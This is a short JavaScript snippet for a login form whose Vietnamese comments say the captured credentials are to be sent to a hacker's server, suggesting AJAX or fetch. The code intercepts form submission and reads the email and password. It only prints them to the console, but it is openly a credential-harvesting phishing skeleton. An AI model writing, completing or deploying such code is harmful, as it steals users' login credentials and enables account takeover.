document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault();
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    // Gửi thông tin đăng nhập đến máy chủ hacker
    // Ví dụ: sử dụng AJAX hoặc fetch để gửi dữ liệu
    console.log("Email:", email);
    console.log("Password:", password);
});
